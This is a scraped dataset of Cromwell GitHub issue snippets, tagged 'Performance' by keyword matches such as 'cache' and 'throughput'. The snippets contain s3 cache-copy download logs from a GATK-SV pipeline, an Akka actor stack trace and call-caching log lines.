s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-132/cacheCopy/SR00c.NA19449.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:48075,cache,cacheCopy,48075,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-141/cacheCopy/SR00c.NA20126.txt.gz; 1608597554503,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-149/cacheCopy/SR00c.NA20764.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-149/cacheCopy/SR00c.NA20764.txt.gz.tbi; 1608597557397,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-59/cacheCopy/SR00c.HG02374.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-59/cacheCopy/SR00c.HG02374.txt.gz; 1608597560491,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-10/cacheCopy/SR00c.HG00349.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:172411,cache,cacheCopy,172411,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-147/cacheCopy/SR00c.NA20522.txt.gz.tbi; 1608597122029,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-7/cacheCopy/SR00c.HG00277.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-7/cacheCopy/SR00c.HG00277.txt.gz.tbi; 1608597125075,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-44/cacheCopy/SR00c.HG01982.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-44/cacheCopy/SR00c.HG01982.txt.gz; 1608597127083,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-126/cacheCopy/SR00c.NA19143.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:51204,cache,cacheCopy,51204,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-150/cacheCopy/SR00c.NA20802.txt.gz; 1608597164800,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-103/cacheCopy/SR00c.NA06984.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-103/cacheCopy/SR00c.NA06984.txt.gz.tbi; 1608597167270,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-152/cacheCopy/SR00c.NA20869.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-152/cacheCopy/SR00c.NA20869.txt.gz; 1608597169668,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-47/cacheCopy/SR00c.HG02019.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:62423,cache,cacheCopy,62423,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-2/cacheCopy/SR00c.HG00129.txt.gz.tbi; 1608596964153,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-86/cacheCopy/SR00c.HG03649.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-86/cacheCopy/SR00c.HG03649.txt.gz.tbi; 1608596966063,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-120/cacheCopy/SR00c.NA18956.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-120/cacheCopy/SR00c.NA18956.txt.gz.tbi; 1608596968605,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-37/cacheCopy/SR00c.HG01794.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:7549,cache,cacheCopy,7549,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-20/cacheCopy/SR00c.HG01060.txt.gz.tbi; 1608597604365,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-50/cacheCopy/SR00c.HG02085.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-50/cacheCopy/SR00c.HG02085.txt.gz.tbi; 1608597606470,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-6/cacheCopy/SR00c.HG00239.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-6/cacheCopy/SR00c.HG00239.txt.gz.tbi; 1608597610071,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-45/cacheCopy/SR00c.HG02002.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:184838,cache,cacheCopy,184838,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-28/cacheCopy/SR00c.HG01393.txt.gz.tbi; 1608596987867,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-79/cacheCopy/SR00c.HG03370.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-79/cacheCopy/SR00c.HG03370.txt.gz.tbi; 1608596990438,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-7/cacheCopy/SR00c.HG00277.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-7/cacheCopy/SR00c.HG00277.txt.gz; 1608596992645,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-24/cacheCopy/SR00c.HG01325.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a2",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:14416,cache,cacheCopy,14416,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-3/cacheCopy/SR00c.HG00140.txt.gz.tbi; 1608597459482,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-67/cacheCopy/SR00c.HG02642.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-67/cacheCopy/SR00c.HG02642.txt.gz.tbi; 1608597462345,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-51/cacheCopy/SR00c.HG02186.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-51/cacheCopy/SR00c.HG02186.txt.gz; 1608597465182,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-77/cacheCopy/SR00c.HG03111.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:143476,cache,cacheCopy,143476,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-4/cacheCopy/SR00c.HG00150.txt.gz.tbi; 1608597074143,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz.tbi; 1608597076382,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-57/cacheCopy/SR00c.HG02332.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-57/cacheCopy/SR00c.HG02332.txt.gz.tbi; 1608597078723,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-26/cacheCopy/SR00c.HG01356.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4e",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:37482,cache,cacheCopy,37482,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-5/cacheCopy/SR00c.HG00187.txt.gz.tbi; 1608597159853,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-97/cacheCopy/SR00c.HG03872.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-97/cacheCopy/SR00c.HG03872.txt.gz.tbi; 1608597162870,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-150/cacheCopy/SR00c.NA20802.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-150/cacheCopy/SR00c.NA20802.txt.gz; 1608597164800,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-103/cacheCopy/SR00c.NA06984.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:61173,cache,cacheCopy,61173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,49 hotfix summary throughput,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5446:18,throughput,throughput,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5446,1,['throughput'],['throughput']
Performance,"4:37:35,25] [info] watching Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$c/$a/$b#797880880]; [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:1:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:10:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:5770,concurren,concurrent,5770,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"4:main.year_of_birth:-1:1 cache hit copying success with aggregated hashes: initial = 09247459DDA5EA8DF661D5F490C81E8B, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:22:59,84] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.year_of_birth:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:23:00,36] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.phenotype:-1:1-20000000025 [9e4f5894main.phenotype:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:23:00,36] [info] BT-322 9e4f5894:main.phenotype:-1:1 cache hit copying success with aggregated hashes: initial = 018D1BC619E22671C2125EEDE82AB210, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:23:00,36] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.phenotype:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:23:00,37] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.date_of_death:-1:1-20000000026 